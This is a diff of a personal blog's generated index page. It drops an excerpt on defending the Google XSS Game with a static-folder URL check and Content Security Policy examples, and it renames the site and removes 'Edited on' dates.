-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scriptEl = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line"><span class="comment">// Reject the url if it&#x27;s not under the static folder</span></span><br><span class="line"><span class="keyword">if</span> (!url.<span class="title function_">match</span>(<span class="regexp">/^\/static\//</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;log&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_">setInnerText</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;log&quot;</span>),</span><br><span class="line">            <span class="string">&quot;Sorry, cannot load a URL not from /static/.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Defense-via-Content-Security-Policy"><a href="#Defense-via-Content-Security-Policy" class="headerlink" title="Defense via Content Security Policy"></a>Defense via Content Security Policy</h2><h3 id="CSP2-0"><a href="#CSP2-0" class="headerlink" title="CSP2.0"></a>CSP2.0</h3><ul>
-<li>Example code: <code>default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;; style-src &#39;self&#39;; base-uri &#39;self&#39;; form-action &#39;self&#39;</code></li>
-<li>Patched code using CSP2.0: <code>src/csp2/</code> from <code>l1</code> to <code>l6</code></li>
-</ul>
-<h3 id="CSP3-0"><a href="#CSP3-0" class="headerlink" title="CSP3.0"></a>CSP3.0</h3><ul>
-<li>Example code: <code>script-src &#39;self&#39; &#39;nonce-N42HzqVZYhG0RWr8CwB8hQ==&#39; ;&#39;</code></li>
-<li>Patched code is available in <code>./code/csp3/</code> from <code>l1</code> to <code>l6</code>. Inline code is refactored and external files are downloaded to comply with the CPS requirements</li>
-</ul>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/10/15/Cracking-and-Patching-the-Google-XSS-Game/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -513,12 +373,12 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="KCCarlos's Notes">
+      <meta itemprop="name" content="KC Blog">
       <meta itemprop="description" content="Curiosity">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | KCCarlos's Notes">
+      <meta itemprop="name" content="undefined | KC Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -535,13 +395,6 @@
       <span class="post-meta-item-text">Posted on</span>
 
       <time title="Created: 2019-06-03 17:45:52" itemprop="dateCreated datePublished" datetime="2019-06-03T17:45:52-04:00">2019-06-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-11-06 16:02:52" itemprop="dateModified" datetime="2022-11-06T16:02:52-05:00">2022-11-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -605,12 +458,12 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="KCCarlos's Notes">
+      <meta itemprop="name" content="KC Blog">
       <meta itemprop="description" content="Curiosity">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | KCCarlos's Notes">
+      <meta itemprop="name" content="undefined | KC Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -627,13 +480,6 @@
       <span class="post-meta-item-text">Posted on</span>
 
       <time title="Created: 2019-03-18 20:13:40" itemprop="dateCreated datePublished" datetime="2019-03-18T20:13:40-04:00">2019-03-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-11-06 16:01:25" itemprop="dateModified" datetime="2022-11-06T16:01:25-05:00">2022-11-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -697,12 +543,12 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="KCCarlos's Notes">
+      <meta itemprop="name" content="KC Blog">
       <meta itemprop="description" content="Curiosity">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | KCCarlos's Notes">
+      <meta itemprop="name" content="undefined | KC Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
@@ -719,13 +565,6 @@
       <span class="post-meta-item-text">Posted on</span>
 
       <time title="Created: 2018-11-11 10:23:15" itemprop="dateCreated datePublished" datetime="2018-11-11T10:23:15-05:00">2018-11-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-11-06 16:02:17" itemprop="dateModified" datetime="2022-11-06T16:02:17-05:00">2022-11-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
